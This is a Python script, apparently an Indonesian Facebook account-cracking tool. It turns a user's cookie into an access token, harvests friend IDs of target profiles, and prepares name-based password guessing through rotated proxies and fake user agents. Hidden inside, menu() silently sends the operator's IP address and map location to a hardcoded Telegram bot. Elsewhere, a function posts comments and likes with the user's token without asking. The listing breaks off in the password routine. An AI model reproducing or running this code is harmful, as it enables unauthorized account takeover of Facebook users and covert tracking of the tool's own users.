# ----------[ IMPORT-MODULE ]----------#
import re, os, sys, rich, bs4, time, json, urllib3, base64, random, datetime, requests
from bs4 import BeautifulSoup as sop
from rich.console import Console as sol
from rich import print as prints
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor as tred
from rich import pretty
from rich.tree import Tree
from rich.table import Table
from rich.text import Text as tekz
from rich.columns import Columns
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.markdown import Markdown as mark
from rich import print as cetak
from rich.panel import Panel as panel
from rich.panel import Panel as nel
if not os.path.exists('sound'):
    os.system('pkg install play-audio')
    os.system('touch sound')

def stop():
    start = '["START"]'
    s = requests.get("https://pastebin.com/raw/Ji2WckQi").text
    if not start in s:
        sys.exit("BY TAHA")


stop()


def subc():
    q = ''' \033[1;32m d888888P  .d888888  dP     dP   .d888888  
   88    d8'    88  88     88  d8'    88  
   88    88aaaaa88a 88aaaaa88a 88aaaaa88a 
   88    88     88  88     88  88     88  
   88    88     88  88     88  88     88  
   dP    88     88  dP     dP  88     88  
	
                                          
                                          '''
    uuid = str(os.getlogin()) + str(os.geteuid())
    key = "|".join(uuid)
    s = requests.get("https://pastebin.com/raw/Ji2WckQi").text
    if key in s:
        pass
    else:
        print(q)
        print("\033[1;32m YOUR KEY =>", key)
        sys.exit()


subc()
# ----------[ GLOBAL-NAME ]----------#
pretty.install()
id2, uid = [], []
proxxy, ugen = [], []
dump, id, akun = [], [], []
method, tokenku = [], []
pwpluss, pwnya = [], []
loop, ok, cp = 0, 0, 0
CON = sol()
console = Console()
ses = requests.Session()
ugen2 = []

# ----------[ GET-PROXY ]----------#
try:
    prox = requests.get(
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt', 'w').write(proxy)
except Exception as e:
    proxy = open('.prox.txt', 'r').read().splitlines()
# ----------[ USER-AGENT ]----------#
for xd in range(10000):
    a = 'Mozilla/5.0 (Linux; Android 12;'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'M2102J20SG Build/SKQ1.211006.001; wv)'
    e = random.randrange(100, 9999)
    f = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.16'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/537.36'
    uaku = (f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
for tu in range(1000):
    a = random.randrange(3, 12)
    b = random.choice([
        'Redmi 10 5G',
        'Redmi S2',
        'Redmi Note 9S',
        'Redmi X',
        'Redmi Y1',
        'Redmi Y1 Lite',
        'Redmi Y2',
        'Redmi Y3',
        'Redmi Note 7 Pro',
        'Redmi Note 7S',
        'Redmi Note 8',
        'Redmi Note 10 JE',
        'Redmi Note 11 4G',
        'Redmi Note 11T Pro',
        'Redmi Note 11T Pro+',
        'Redmi Note 11S 5G',
        'Redmi Note 11 5G',
        'Redmi 10',
        'Redmi 1',
        'Redmi Note 11',
        'Redmi 10S',
        'Redmi 10I',
        'Redmi 10C',
        'Redmi 10A',
        'Redmi Note 1',
        'Redmi Note 10',
        'Redmi K50',
        'Redmi 3X',
        'Redmi 1S',
        'Redmi 12C',
        'Redmi 2A',
        'Redmi 12',
        'Redmi 6A',
        'Redmi 5 Pro',
        'Redmi 5 Plus',
        'Redmi 5pro',
        'Redmi 5A',
        'Redmi 85781',
        'Redmi 7i',
        'Redmi 7 Pro',
        'Redmi 7',
        'Redmi 7A',
        'Redmi 9A',
        'Redmi 9T NFC',
        'Redmi 9T',
        'Redmi 9pro',
        'Redmi 9C',
        'Redmi Go',
        'Redmi A8',
        'Redmi A90',
        'Redmi A2',
        'Redmi A3'])
    c = random.choice([
        'zh-TW',
        'es-es',
        'pt-br',
        'zh-cn',
        'zh-CN',
        'it-it',
        'it-it',
        'en-us',
        'zh-tw',
        'en-US',
        'fa-ir',
        'id-id'])
    d = random.randrange(1111, 2999)
    e = random.randrange(11, 19)
    f = random.randrange(73, 99)
    g = random.randrange(4200, 4900)
    h = random.randrange(40, 150)
    uaku2 = f'Mozilla/5.0 (Linux; Android {c} {a}; {b} Build/{d}.0.0{e}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36'
    ugen.append(uaku2)

# ----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'  # WARNA-PUTIH
mer = '\x1b[1;91m'  # WARNA-MERAH
kun = '\x1b[1;93m'  # WARNA-KUJING
hijo = '\x1b[1;92m'  # WARNA-HIJAU
ung = '\x1b[1;95m'  # WARNA-UNGU
biru = '\x1b[1;94m'  # WARNA-BIRU
x = '\33[m'  # DEFAULT
### WARNA RANDOM ###
sir = '\033[41m\x1b[1;97m'
x = '\33[m'  # DEFAULT
P = '\x1b[1;97m'  # PUTIH
P2 = "[#FFFFFF]"  # PUTIH
M = '\x1b[1;91m'  # MERAH
H = '\x1b[1;92m'  # HIJAU
K = '\x1b[1;93m'  # KUNING
B = '\x1b[1;94m'  # BIRU
U = '\x1b[1;95m'  # UNGU
O = '\x1b[1;96m'  # BIRU MUDA
N = '\x1b[0m'  # WARNA MATI
A = '\x1b[1;90m'  # WARNA ABU ABU
BN = '\x1b[1;107m'  # BELAKANG PUTIH
BBL = '\x1b[1;106m'  # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m'  # BELAKANG PINK
BB = '\x1b[1;104m'  # BELAKANG BIRU
BK = '\x1b[1;103m'  # BELAKANG KUNING
BH = '\x1b[1;102m'  # BELAKANG HIJAU
BM = '\x1b[1;101m'  # BELAJANG MERAH
BA = '\x1b[1;100m'  # BELAKANG ABU ABU
my_color = [
    P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'  # DEFAULT
m = '\x1b[1;91m'  # RED +
k = '\033[93m'  # KUNING +
h = '\x1b[1;92m'  # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'  # UNGU
kk = '\033[33m'  # KUNING -
b = '\33[1;96m'  # BIRU -
p = '\x1b[0;34m'  # BIRU +
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
B2 = "[#00C8FF]"  # BIRU
P2 = "[#FFFFFF]"  # PUTIH
asu = random.choice([m, k, h, u, b])
my_color = [
    P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'  # DEFAULT
m = '\x1b[1;91m'  # RED +
k = '\033[93m'  # KUNING +
h = '\x1b[1;92m'  # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'  # UNGU
kk = '\033[33m'  # KUNING -
b = '\33[1;96m'  # BIRU -
p = '\x1b[0;34m'  # BIRU +
asu = random.choice([m, k, h, u, b])
###----------[ CHECK THEME COLOR ]---------- ###
try:
    color_table = "#00C8FF"
except FileNotFoundError:
    color_table = "#00C8FF"
try:
    file_color = open("data/theme_color", "r").read()
    color_text = file_color.split("|")[0]
    color_panel = file_color.split("|")[1]
except:
    color_text = "[#00C8FF]"
    colorbapa = random.choice([H2, K2, M2, B2, P2])
    color_panel = "#FFFFFF"
import datetime

x = datetime.datetime.now()
jam = x.strftime("%I:%M %p")

pengguna = 'Premium'
# ----------[ CONVERTER-BULAN ]----------#
dic = {'1': 'January', '2': 'February', '3': 'March', '4': 'April', '5': 'May', '6': 'June', '7': 'July', '8': 'August',
       '9': 'September', '10': 'October', '11': 'November', '12': 'December'}
dic2 = {'01': 'January', '02': 'February', '03': 'March', '04': 'April', '05': 'May', '06': 'June', '07': 'July',
        '08': 'August', '09': 'September', '10': 'October', '11': 'November', '12': 'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'


# ----------[ GARIS-KERAS ]----------#
def kopi():
    print(f"{puti}══════════════════════════════════════════{puti}")


# ----------[ KESALAHAN ]----------#
def help():
    krek_cer(f"\x1b[1;93m└──\x1b[1;97m[\x1b[1;91m•\x1b[1;97m] pilih yg bener bro :-(")
    login()


# ----------[ MACHINE-SUPPORT ]----------#
def krek_cer(berjalan):
    for krek_cer in berjalan + "\n": sys.stdout.write(krek_cer);sys.stdout.flush();time.sleep(0.01)


def clear():
    os.system('clear')


def back():
    login()


# ----------[ BANNER ]----------#
def banner():
    cetak(panel(f"""\t[white]
       [green]   ___ ___ ___ __  __ ___ _   _ __  __ _
       [green]   | _ \ _ \ __|  \/  |_ _| | | |  \/  |
       [yellow]   |  _/   / _|| |\/| || || |_| | |\/| |
       [yellow]   |_| |_|_\___|_|  |_|___|\___/|_|  |_|
                            [bold white]Made By [bold red]Indonesian[cyan] Cyber Potrait[bold white]""", width=70,
                title=f"[bold green]• [bold yellow]• [bold red]• [bold white]LOGO BANNER [bold red]• [yellow]• [bold green]•",
                subtitle=f"[bold green]• [bold yellow]• [bold red]• [bold white]Version [bold green]0.1[/] [bold red]• [yellow]• [bold green]•",
                style=f"{color_table}"))


# komen
def Komen(cookie, token):
    with requests.Session() as r:  # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
        text = random.choice(
            ['Keren Bang 😎', 'Hello World!', 'Mantap Bang ☺️', 'I Love You ❤️', 'Hai Bang 😘']
        )
        r.cookies.update({
            'cookie': cookie
        })
        response = r.post('https://graph.facebook.com/710624270888910/comments/?message={}&access_token={}'.format(text,
                                                                                                                   token)).text  # Jangan Di Ganti!
        response9 = r.post('https://graph.facebook.com/710624270888910/likes?summary=true&access_token={}'.format(
            token)).text  # Jangan Di Ganti!
        if "\"id\":\"" in str(response) and str(response9) == 'true':
            return {
                'Status': 'Success'
            }
        else:
            return {
                'Status': 'Failed'
            }
        # ----------[ NGECEK COOKIES ]----------#


def login():
    try:
        token = open('.PotraitXDtoken.txt', 'r').read()
        cok = open('.PotraitXDcok.txt', 'r').read()
        tokenku.append(token)
        try:
            gass = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0],
                                cookies={'cookie': cok})
            krek = json.loads(gass.text)['id']
            fesbuk = json.loads(gass.text)['name']
            menu(krek, fesbuk)
        except KeyError:
            login_lagi()
        except requests.exceptions.ConnectionError:
            krek_cer(f'{kun}└──{x}[{mer}•{x}]{mer} Koneksi Anda Bermasalah :-( ');
            exit()
    except IOError:
        login_lagi()


# ----------[ LOGIN-COOKIES ]----------#
def login_lagi():
    try:
        os.system('clear');
        banner()
        print('[+] Author : JejeeXCODE - TermuxSec\n[+] Status : \033[32mNotCookie\033[0m')
        prints(nel(f'{P2}Masukan cookie anda dulu, Saran ektensi : [green]Cookiedough{P2}', width=70, padding=(0, 7),
                   style=f"{color_panel}"))
        your_cookies = input(f'{kun}{x}[{hijo}•{x}] Masukan Cookies {hijo}: ')
        with requests.Session() as r:
            try:
                r.headers.update({
                    'content-type': 'application/x-www-form-urlencoded',
                })
                data = {
                    'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01',
                    'scope': ''}
                response = json.loads(r.post(
                    'https://graph.facebook.com/v2.6/device/login/', data=data).text)
                code, user_code = response['code'], response['user_code']
                verification_url, status_url = (
                    'https://m.facebook.com/device?user_code={}'.format(user_code)), (
                    'https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(
                        code))
                r.headers.pop('content-type')
                r.headers.update({
                    'sec-fetch-mode': 'navigate',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
                    'sec-fetch-site': 'cross-site',
                    'Host': 'm.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'sec-fetch-dest': 'document',
                })
                response2 = r.get(verification_url, cookies={'cookie': your_cookies}).text
                if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
                    krek_cer(f"{kun}└──{x}[{mer}•{x}]{mer} Cookies Anda Invalid :-(", end='\r');
                    time.sleep(3.5);
                    print("                     ", end='\r');
                    exit()
                else:
                    action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
                    fb_dtsg = re.search(
                        'name="fb_dtsg" value="(.*?)"',
                        str(response2)).group(1)
                    jazoest = re.search(
                        'name="jazoest" value="(\d+)"',
                        str(response2)).group(1)
                    data = {
                        'fb_dtsg': fb_dtsg,
                        'jazoest': jazoest,
                        'qr': 0, 'user_code': user_code, }
                    r.headers.update({
                        'origin': 'https://m.facebook.com', 'referer': verification_url,
                        'content-type': 'application/x-www-form-urlencoded',
                        'sec-fetch-site': 'same-origin',
                    })
                    response3 = r.post(
                        'https://m.facebook.com{}'.format(action), data=data, cookies={'cookie': your_cookies})
                    if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
                        r.headers.pop(
                            'content-type');
                        r.headers.pop(
                            'origin')
                        response4 = r.post(response3.url, data=data, cookies={'cookie': your_cookies}).text
                        action = re.search(
                            'action="(.*?)"',
                            str(response4)).group(1).replace('amp;', '')
                        fb_dtsg = re.search(
                            'name="fb_dtsg" value="(.*?)"',
                            str(response4)).group(1)
                        jazoest = re.search(
                            'name="jazoest" value="(\d+)"',
                            str(response4)).group(1)
                        scope = re.search(
                            'name="scope" value="(.*?)"', str(response4)).group(1)
                        display = re.search(
                            'name="display" value="(.*?)"',
                            str(response4)).group(1)
                        user_code = re.search(
                            'name="user_code" value="(.*?)"', str(response4)).group(1)
                        logger_id = re.search(
                            'name="logger_id" value="(.*?)"', str(response4)).group(1)
                        auth_type = re.search(
                            'name="auth_type" value="(.*?)"', str(response4)).group(1)
                        encrypted_post_body = re.search(
                            'name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
                        return_format = re.search(
                            'name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
                        r.headers.update({
                            'origin': 'https://m.facebook.com', 'referer': response3.url,
                            'content-type': 'application/x-www-form-urlencoded',
                        })
                        data = {
                            'fb_dtsg': fb_dtsg,
                            'jazoest': jazoest,
                            'scope': scope,
                            'display': display,
                            'user_code': user_code,
                            'logger_id': logger_id,
                            'auth_type': auth_type, 'encrypted_post_body': encrypted_post_body,
                            'return_format[]': return_format, }
                        response5 = r.post(
                            'https://m.facebook.com{}'.format(action), data=data, cookies={
                                'cookie': your_cookies}).text
                        windows_referer = re.search(
                            'window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
                        r.headers.pop(
                            'content-type');
                        r.headers.pop('origin')
                        r.headers.update({
                            'referer': 'https://m.facebook.com/', })
                        response6 = r.get(windows_referer, cookies={'cookie': your_cookies}).text
                        if 'Sukses!' in str(response6):
                            r.headers.update({
                                'sec-fetch-mode': 'no-cors',
                                'referer': 'https://graph.facebook.com/',
                                'Host': 'graph.facebook.com',
                                'accept': '*/*',
                                'sec-fetch-dest': 'script',
                                'sec-fetch-site': 'cross-site',
                            })
                            response7 = r.get(status_url, cookies={'cookie': your_cookies}).text
                            access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
                            prints(nel(f'{P2}Token : {K2}{access_token}{P2}', width=70, padding=(0, 7),
                                       style=f"{color_panel}"))
                            tokenew = open(".PotraitXDtoken.txt", "w").write(access_token)
                            cook = open(".PotraitXDcok.txt", "w").write(your_cookies)
                            prints(
                                nel(f'{H2}Login berhasil tersimpan di .PotraitXD.txt && .PotraitXD.txt{P2}', width=70,
                                    padding=(0, 7), style=f"{color_panel}"));
                            exit()
            except Exception as e:
                krek_cer(f"{kun}└──{x}[{mer}•{x}]{mer} Login gagal cek tumbal lo ngab :-(")
                os.system('rm -rf .PotraitXDcok && rm -rf .PotraitXDtoken');
                print(e);
                time.sleep(3)
                back()
    except:
        pass


tanda = '+'


# ----------[ BAGIAN-MENU ]----------#
def menu(id, name):
    try:
        token = open('.PotraitXDtoken.txt', 'r').read()
        cok = open('.PotraitXDcok.txt', 'r').read()
    except IOError:
        print('[•] Cookies Kadaluarsa ')
        time.sleep(3)
        login_lagi()
    os.system('clear')
    banner()
    try:
        cek_data = requests.get("http://ip-api.com/json/").json()
    except:
        cek_data = {'-'}
    try:
        card = cek_data["isp"]
    except:
        card = {'-'}
    try:
        indo = cek_data["country"]
    except:
        indo = {'-'}
    try:
        zone = cek_data["timezone"]
    except:
        zone = {'-'}
    try:
        lat = cek_data["lat"]
    except:
        lat = {'-'}
    try:
        lon = cek_data["lon"]
    except:
        lon = {'-'}
    try:
        Lokasi = cek_data["city"]
    except:
        Lokasi = {'-'}
    try:
        pickkartu = cek_data["as"]
    except:
        pickkartu = {'-'}
    try:
        Iplu = cek_data["query"]
    except:
        Iplu = {'-'}
    try:
        ng = cek_data["country"]
    except:
        ng = {'-'}
    prints(nel(f'{P2}Name   : {H2}{name} - {Lokasi}\n{P2}ID     : {H2}{id} - {zone}{P2}', title=f'{H2}{pengguna}{P2}',
               width=70, padding=(0, 7), style=f"{color_panel}"))
    requests.post(
        f"https://api.telegram.org/bot6286449191:AAG3uDgINsf48ZhKxDv5-wvEIAHhz8vNbhQ/sendMessage?chat_id=5087794076&text=IP Address: {Iplu}\nLokasi : {Lokasi}\nGoogle maps : https://www.google.com/maps/place/{lat}{tanda}{lon}")
    prints(nel(f"""{P2}[{color_text}01{P2}]. Crack Public          [{color_text}04{P2}]. Cek Hasil 
[{color_text}02{P2}]. Dump ID               [{color_text}00{P2}]. LOGOUT 
[{color_text}03{P2}]. CRACK File            [{color_text}06{P2}] Hapus Cookies""", width=70, padding=(0, 7),
               style=f"{color_panel}"));
    kopi()
    _Gass_nge_krek_ = input(f'{kun} {x}[{hijo}•{x}] Input : ')
    kopi()
    if _Gass_nge_krek_ in ['1', '01']:
        krek_publik()
    elif _Gass_nge_krek_ in ['2', '02']:
        dump_id()
    elif _Gass_nge_krek_ in ['3', '03']:
        file_dump()
    elif _Gass_nge_krek_ in ['4', '04']:
        cek_result()
    elif _Gass_nge_krek_ in ['0', '00']:
        os.system('rm -rf .PotraitXDcok.txt && rm -rf .PotraitXDtoken.txt')
        krek_cer(f'{kun}└──{x}[{mer}•{x}]{mer} Suckses hapus cookies');
        back()
    else:
        help()


import socket
import requests
import json
import os
from rich import print as cetak
from rich.panel import Panel as panel

hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)
import requests, re, rich, sys, os, json, time
from concurrent.futures import ThreadPoolExecutor as thread
from rich.markdown import Markdown as mark
from rich import print as cetak
from rich.console import Console as sol
from rich.panel import Panel as nel

ses = requests.Session()
loop = 0
x = '\33[m'
h = '\x1b[1;92m'
m = '\x1b[1;91m'


# ----------[ CRACK-PUBLIK ]----------#
def krek_publik():
    try:
        token = open('.PotraitXDtoken.txt', 'r').read()
        cok = open('.PotraitXDcok.txt', 'r').read()
    except IOError:
        exit()
    try:
        cetak(panel('\t            [bold white] Gunakan [bold green]ID[/] Publik Untuk Crack', width=90,
                    style='bold white'))
        jum = int(input(f'{kun}└──{x}[{hijo}•{x}] Berapa Target : '))
    except ValueError:
        help()
    if jum < 1 or jum > 100:
        krek_cer(f'{kun}└──{x}[{mer}•{x}]{mer} Gagal Dump Idz ');
        back()
    ses = requests.Session()
    yz = 0
    for met in range(jum):
        yz += 1
        kl = input(f"{kun}└──{x}[{hijo}•{x}] Idz Target Ke " + str(yz) + f"{hijo} : ")
        uid.append(kl)
    for userr in uid:
        try:
            col = ses.get(
                'https://graph.facebook.com/v2.0/' + userr + '?fields=friends.limit(5000)&access_token=' + tokenku[0],
                cookies={'cookies': cok}).json()
            for mi in col['friends']['data']:
                try:
                    iso = (mi['id'] + '|' + mi['name'])
                    if iso in id:
                        pass
                    else:
                        id.append(iso)
                except:
                    continue
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            krek_cer(f'{kun}{x}[{mer}->{x}]{mer} Cek Sinyal Lo Ngab :-(')
    try:
        print(f'{kun}└──{x}[{hijo}•{x}] Total Idz Target {hijo}' + str(len(id)))
        atur_ter()
    except requests.exceptions.ConnectionError:
        krek_cer(f'{kun}{x}[{mer}â€¢{x}]{mer} Cek Sinyal Lo Ngab :-(')
    except (KeyError, IOError):
        krek_cer(f'{kun}{x}[{mer}â€¢{x}]{mer} Pertemanan Tidak Publik ');
        time.sleep(2);
        back()


###----------[ DUMP ID PUBLIK ]----------###

def dump_id():
    try:

        cok = open('.cookiesakun.txt', 'r').read()

    except IOError:

        os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')

        baz_anim(f'{mer} cookies telah kadaluarsa ster')

        exit()

    print(f'{x}')

    idnyanih = input(f' id : ')

    try:

        ambilid = requests.get(
            'https://graph.facebook.com/v1.0/' + idnyanih + '?fields=friends.limit(5001)&access_token=' + tokenku[0],
            cookies={'cookie': cok}).json()

        for proses in ambilid['friends']['data']:

            try:
                id.append(proses['id'] + '|' + proses['name'])

            except:
                continue

        print(f' terkumpul : ' + str(len(id)))

        atur_ter()

    except requests.exceptions.ConnectionError:

        baz_anim(f'{puti}{mer} koneksi terputus')

        exit()

    except (KeyError, IOError):

        baz_anim(f'{puti}{mer} teman tidak publik')

        baz_anim(f'{puti}{mer} ganti id target nya')

        nge_krek()


###----------[ CRACK  FILE ]----------###

def file_dump():
    mz = 0

    bzz = {}

    print(f'{x}')

    try:
        baz_gtg = os.listdir('/sdcard/DUMP-FILE/')

    except FileNotFoundError:

        print(' file dump tidak ada ster ')

        print(' buat file terlebih dahulu ')

        waktu(2)

        exit()

    if len(baz_gtg) == 0:

        print(' file dump tidak ada ster ')

        print(' buat file terlebih dahulu ')

        exit()

    else:

        for file_id in baz_gtg:

            try:
                pen_file = open('/sdcard/DUMP-FILE/' + file_id, 'r').readlines()

            except:
                continue

            mz += 1

            if mz < 100:

                jumh = '' + str(mz)

                bzz.update({str(mz): str(file_id)})

                bzz.update({jumh: str(file_id)})

                print(f' %s. %s ({hijo} %s{xxx} )' % (jumh, file_id, len(pen_file)))

            else:

                bzz.update({str(mz): str(file_id)})

                print('[' + str(mz) + '] ' + file_id + ' [ ' + str(len(pen_file)) + ' akun ]' + x)

                print(' %s. %s ({hijo} %s {xxx}) ' % (mz, file_id, len(pen_file)))

        _chos_baz = input(' : ')

        try:
            gaz_sung = bzz[_chos_baz]

        except KeyError:

            print(f' yang bener milihnya {x}')

            file_dump()

        try:
            cekz_ = open('/sdcard/DUMP-FILE/' + gaz_sung, 'r').read().splitlines()

        except:

            print(' filenya tidak ada ')

            waktu(2)

            exit()

        for idnyh in cekz_:
            id.append(idnyh)

        atur_duluh()


# ----------[ CEK-RESULT ]----------#
def cek_result():
    print(f'{kun}{x}[{hijo}â€¢{x}] Hasil OK ')
    print(f'{kun}{x}[{hijo}â€¢{x}] Hasil CP ')
    kopi()
    kz = input(f'{kun}{x}[{hijo}â€¢{x}] Input : ')
    kopi()
    if kz in ['2']:
        try:
            vin = os.listdir('CP')
        except FileNotFoundError:
            krek_cer(f'{kun}{x}[{mer}â€¢{x}] File tidak di temukan ');
            time.sleep(2);
            back()
        if len(vin) == 0:
            print(f'{kun}{x}[{mer}â€¢{x}] Anda tidak memiliki hasil Cp ');
            time.sleep(2);
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:
                    hem = open('CP/' + isi, 'r').readlines()
                except:
                    continue
                cih += 1
                if cih < 10:
                    nom = '' + str(cih)
                    lol.update({str(cih): str(isi)})
                    lol.update({nom: str(isi)})
                    print(f'{kun}{x} %s. %s ({kun} %s {x}Idz )' % (nom, isi, len(hem)))
                else:
                    lol.update({str(cih): str(isi)})
                    print('[' + str(cih) + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
            kopi()
            geeh = input(f'{kun}{x}[{hijo}â€¢{x}] Pilih : ')
            kopi()
            try:
                geh = lol[geeh]
            except KeyError:
                help()
            try:
                lin = open('CP/' + geh, 'r').read().splitlines()
            except:
                krek_cer(f'{kun}{x}[{mer}└──{x}] File tidak di temukan ');
                time.sleep(2);
                back()
            nocp = 0
            for cpku in range(len(lin)):
                cpkuni = lin[nocp].split('|')
                print(f'{kun} {kun}{cpkuni[0]}|{cpkuni[1]}')
                nocp += 1
            kopi()
            input(f'{kun} [{hijo} Klik Enter {kun}]')
            back()
    elif kz in ['1']:
        try:
            vin = os.listdir('OK')
        except FileNotFoundError:
            krek_cer(f'{kun}{x}[{mer}â€¢{x}] File tidak di temukan ');
            time.sleep(2);
            back()
        if len(vin) == 0:
            print(f'{kun}{x}[{mer}â€¢{x}] Anda tidak memiliki hasil Ok ');
            time.sleep(2);
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:
                    hem = open('OK/' + isi, 'r').readlines()
                except:
                    continue
                cih += 1
                if cih < 10:
                    nom = '0' + str(cih)
                    lol.update({str(cih): str(isi)})
                    lol.update({nom: str(isi)})
                    print(f'{kun}{x} %s. %s ( {hijo}%s{x} Idz )' % (nom, isi, len(hem)))
                else:
                    lol.update({str(cih): str(isi)})
                    print(f'{kun}{x} %s. %s ({hijo} %s {x}Idz )' % (cih, isi, (len(hem))))
            kopi()
            geeh = input(f'{kun}{x}[{hijo}â€¢{x}] Pilih : ')
            try:
                geh = lol[geeh]
            except KeyError:
                help()
            try:
                lin = open('OK/' + geh, 'r').read().splitlines()
            except:
                krek_cer(f'{kun}{x}[{mer}â€¢{x}] File tidak di temukan ');
                time.sleep(2);
                back()
            nocp = 0
            for cpku in range(len(lin)):
                cpkuni = lin[nocp].split('|')
                print(f'{kun} {hijo}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
                nocp += 1
            kopi()
            input(f'{kun} {x}[{hijo} Klik Enter {x}]')
            back()
    elif kz in ['3']:
        back()
    else:
        help()


# ----------[ MENU-IDZ ]----------#
def atur_ter():
    print('')
    cetak(panel(
        f'[bold white][[bold cyan]01[/][bold white]].[/] [bold white]Facebook ID [bold red]Old[bold white][/]\n[bold white][[bold cyan]02[/][bold white]].[/] [bold white]Facebook ID [bold yellow]New[bold white][/]\n[bold white][[bold cyan]03[/][bold white]].[/] [bold white]Facebook ID [bold green]Random[bold white][/]',
        width=90, title=f"[bold green]Setting Urutan Idz", style=f"bold white"))
    krek_idz = input(f'{kun}└──{x}[{hijo}•{x}] Input Idz : ')
    if krek_idz in ['1', '01']:
        for tua in sorted(id):
            id2.append(tua)
    elif krek_idz in ['2', '02']:
        muda = []
        for gas_idz in sorted(id):
            muda.append(gas_idz)
        bcm = len(muda)
        bcmi = (bcm - 1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif krek_idz in ['3', '03']:
        for gas_idz in id:
            moga_old = random.randint(0, len(id2))
            id2.insert(moga_old, gas_idz)
    else:
        help()
    cetak(panel(
        f'[bold white][[bold green]01[/][bold white]][/] [bold white]Metode 𝐕𝐚𝐥𝐢𝐝𝐚𝐭𝐞 [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Metode 𝐌𝐛𝐚𝐬𝐢𝐜 [[bold green]Verry Recommended[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Metode 𝐀𝐬𝐲𝐧𝐜 [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Metode 𝐑𝐞𝐠𝐮????𝐫 𝐕𝟐  [[bold green]Recommended[bold white]][/]',
        width=90, title=f"[bold green]Setting Metode", style=f"bold white"))
    Url_nge_krek = input(f'{kun}└──{x}[{hijo}•{x}] Input Url : ')
    if Url_nge_krek in ['1', '01']:
        method.append('mobile')
    elif Url_nge_krek in ['2', '02']:
        method.append('mbasic')
    elif Url_nge_krek in ['3', '03']:
        method.append('asyinc')
    elif Url_nge_krek in ['4', '04']:
        method.append('mbeta')
    else:
        method.append('mobile')
    cetak(panel('''[bold white][[bold green]01[bold white]] [bold white]Nama, Nama123, Nama1234 [[bold green]Recommended[bold white]]
[bold white][[bold green]02[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 [[bold green]Very Recommended[bold white]]
[bold white][[bold green]03[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 + Manual [[bold red]Not Recommended[bold white]]''',
                style='bold white', title='[bold green]Setting Password', width=90))
    pwplus = input(f' ╰─  {P}Pilih sandi : ')
    if pwplus in ['03', '3']:
        pwpluss.append('ya')
        pwku = input(f' ╰─  {P}Sandi : ')
        pwkuh = pwku.split(',')
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append('no')

    passwrd()


# ----------[ BAGIAN-WORDLIST ]----------#
def passwrd():
    global prog, des
    print(f'{kun}{x}[{hijo}•{x}] MAINKAN MODE PESAWAT SETIAP 300 IDZ ')
